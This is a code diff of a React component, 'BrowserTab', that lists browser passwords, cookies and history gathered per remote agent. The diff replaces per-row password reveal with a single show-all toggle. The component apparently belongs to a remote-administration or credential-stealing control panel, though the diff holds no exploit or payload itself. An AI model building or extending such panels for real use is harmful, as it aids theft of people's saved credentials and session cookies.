@@ -76,7 +76,7 @@ function ScrollLoader({ loading, hasMore, onLoadMore }: { loading: boolean; hasM
 export function BrowserTab({ agentId }: BrowserTabProps) {
   const { t } = useTranslation();
   const [subTab, setSubTab] = useState<string>('passwords');
-  const [showPasswords, setShowPasswords] = useState<Record<number, boolean>>({});
+  const [showAllPasswords, setShowAllPasswords] = useState(false);
 
   const pw = usePagedData<BrowserPassword>(agentId, 'passwords');
   const ck = usePagedData<BrowserCookie>(agentId, 'cookies');
@@ -114,9 +114,6 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
     return [...map.entries()].sort((a, b) => b[1].length - a[1].length);
   }, [hs.items]);
 
-  const togglePassword = (idx: number) =>
-    setShowPasswords(prev => ({ ...prev, [idx]: !prev[idx] }));
-
   const currentErrors = subTab === 'passwords' ? pw.errors : subTab === 'cookies' ? ck.errors : hs.errors;
 
   if (pw.initialLoading && subTab === 'passwords') {
@@ -137,9 +134,14 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
           <Chip variant="soft" color="warning">{t('othersoft.browser.cookies')}: {ck.total}</Chip>
           <Chip variant="soft" color="default">{t('othersoft.browser.history')}: {hs.total}</Chip>
         </div>
-        <Button size="sm" variant="ghost" onPress={handleRefresh}>
-          <ArrowRotateLeft className="w-4 h-4" />
-        </Button>
+        <div className="flex gap-2">
+          <Button size="sm" variant="ghost" onPress={() => setShowAllPasswords(v => !v)}>
+            {showAllPasswords ? <EyeSlash className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+          </Button>
+          <Button size="sm" variant="ghost" onPress={handleRefresh}>
+            <ArrowRotateLeft className="w-4 h-4" />
+          </Button>
+        </div>
       </div>
 
       {currentErrors.length > 0 && (
@@ -174,12 +176,7 @@ export function BrowserTab({ agentId }: BrowserTabProps) {
                       <td className="py-1.5 px-2"><Chip size="sm" variant="soft">{p.browser}</Chip></td>
                       <td className="py-1.5 px-2 max-w-[300px] truncate" title={p.url}>{p.url}</td>
                       <td className="py-1.5 px-2">{p.username}</td>
-                      <td className="py-1.5 px-2 flex items-center gap-1">
-                        <span className="font-mono">{showPasswords[idx] ? p.password : '••••••••'}</span>
-                        <button onClick={() => togglePassword(idx)} className="text-neutral-400 hover:text-neutral-600">
-                          {showPasswords[idx] ? <EyeSlash className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
-                        </button>
-                      </td>
+                      <td className="py-1.5 px-2 font-mono">{showAllPasswords ? p.password : '••••••••'}</td>
                     </tr>
                   ))}
                 </tbody>
